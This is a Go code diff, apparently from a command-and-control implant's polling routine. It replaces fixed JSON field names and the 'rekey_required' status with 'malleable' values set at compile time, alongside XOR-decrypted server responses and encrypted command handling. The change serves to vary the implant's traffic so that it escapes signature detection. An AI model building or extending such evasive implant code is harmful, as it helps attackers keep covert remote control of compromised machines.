@@ -22,6 +22,16 @@ import (
 	"time"
 )
 
+// MALLEABLE_REKEY_COMMAND is the customizable rekey command value
+// This will be replaced at compile time via -ldflags
+var MALLEABLE_REKEY_COMMAND = "rekey_required"
+
+// Malleable JSON field names for rekey response
+// These will be replaced at compile time via -ldflags
+var MALLEABLE_REKEY_STATUS_FIELD = "status"
+var MALLEABLE_REKEY_DATA_FIELD = "data"
+var MALLEABLE_REKEY_ID_FIELD = "command_db_id"
+
 // PollConfig holds the configuration for polling behavior
 type PollConfig struct {
 	GetURL          string
@@ -224,15 +234,12 @@ func doPoll(secureComms *SecureComms, customHeaders map[string]string) error {
 		return fmt.Errorf("failed to parse response: %v", err)
 	}
 
-	// Determine if response is encrypted or not
-	var response struct {
-		Status      string      `json:"status"`
-		Data        string      `json:"data"`
-		CommandDBID interface{} `json:"command_db_id"`
-	}
+	// Use a generic response map instead of struct to support malleable field names
+	var responseMap map[string]interface{}
 
 	// Check if this is an XOR encrypted response
-	if _, hasStatus := rawResponse["status"]; !hasStatus && len(rawResponse) > 0 {
+	// Try to detect by checking if the malleable status field exists
+	if _, hasStatus := rawResponse[MALLEABLE_REKEY_STATUS_FIELD]; !hasStatus && len(rawResponse) > 0 {
 		// Likely encrypted, try to decrypt
 
 		// Get current secret from secureComms
@@ -241,35 +248,46 @@ func doPoll(secureComms *SecureComms, customHeaders map[string]string) error {
 
 		decryptedMap, err := tryDecryptResponse(rawResponse, xorKey)
 		if err != nil {
-			// Couldn't decrypt, maybe it's a legacy response
-			// Try to marshal raw response back into our struct
-			jsonBytes, _ := json.Marshal(rawResponse)
-			json.Unmarshal(jsonBytes, &response)
+			// Couldn't decrypt, use raw response
+			responseMap = rawResponse
 		} else {
 			// Successfully decrypted
-			if statusVal, ok := decryptedMap["status"].(string); ok {
-				response.Status = statusVal
-			}
-			if dataVal, ok := decryptedMap["data"].(string); ok {
-				response.Data = dataVal
-			}
-			if cmdIDVal, ok := decryptedMap["command_db_id"]; ok {
-				response.CommandDBID = cmdIDVal
-			}
+			responseMap = decryptedMap
 		}
 	} else {
-		// Legacy unencrypted response
-		jsonBytes, _ := json.Marshal(rawResponse)
-		json.Unmarshal(jsonBytes, &response)
+		// Unencrypted response
+		responseMap = rawResponse
+	}
+
+	// Extract values using malleable field names
+	var responseStatus string
+	var responseData string
+	var responseCommandDBID interface{}
+
+	if statusVal, ok := responseMap[MALLEABLE_REKEY_STATUS_FIELD]; ok {
+		if s, ok := statusVal.(string); ok {
+			responseStatus = s
+		}
+	}
+	if dataVal, ok := responseMap[MALLEABLE_REKEY_DATA_FIELD]; ok {
+		if d, ok := dataVal.(string); ok {
+			responseData = d
+		}
+	}
+	if cmdIDVal, ok := responseMap[MALLEABLE_REKEY_ID_FIELD]; ok {
+		responseCommandDBID = cmdIDVal
 	}
 
 	// Check for rekey command (special status that doesn't require decryption)
-	if response.Status == "rekey_required" {
-		//fmt.Println("[DEBUG] Received rekey command from server")
+	// Debug: Print the compile-time MALLEABLE_REKEY_COMMAND value
+	//fmt.Printf("[DEBUG] MALLEABLE_REKEY_COMMAND compiled value: %q\n", MALLEABLE_REKEY_COMMAND)
+	//fmt.Printf("[DEBUG] response status from server: %q\n", responseStatus)
+	if responseStatus == MALLEABLE_REKEY_COMMAND {
+		//fmt.Println("[DEBUG] Received rekey command from server - MATCH FOUND!")
 
 		// Extract command DB ID for the rekey result
 		var commandDBID int
-		switch v := response.CommandDBID.(type) {
+		switch v := responseCommandDBID.(type) {
 		case float64:
 			commandDBID = int(v)
 		case int:
@@ -313,13 +331,13 @@ func doPoll(secureComms *SecureComms, customHeaders map[string]string) error {
 	}
 
 	// Check for no commands
-	if response.Status == "no_commands" {
+	if responseStatus == "no_commands" {
 		return nil
 	}
 
 	// Normal encrypted command processing
-	if response.Data != "" {
-		decrypted, err := secureComms.DecryptMessage(response.Data)
+	if responseData != "" {
+		decrypted, err := secureComms.DecryptMessage(responseData)
 		if err != nil {
 			// Log decryption failure which might indicate key desync
 			//fmt.Println("[DEBUG] Key desync detected - initiating automatic rekey")
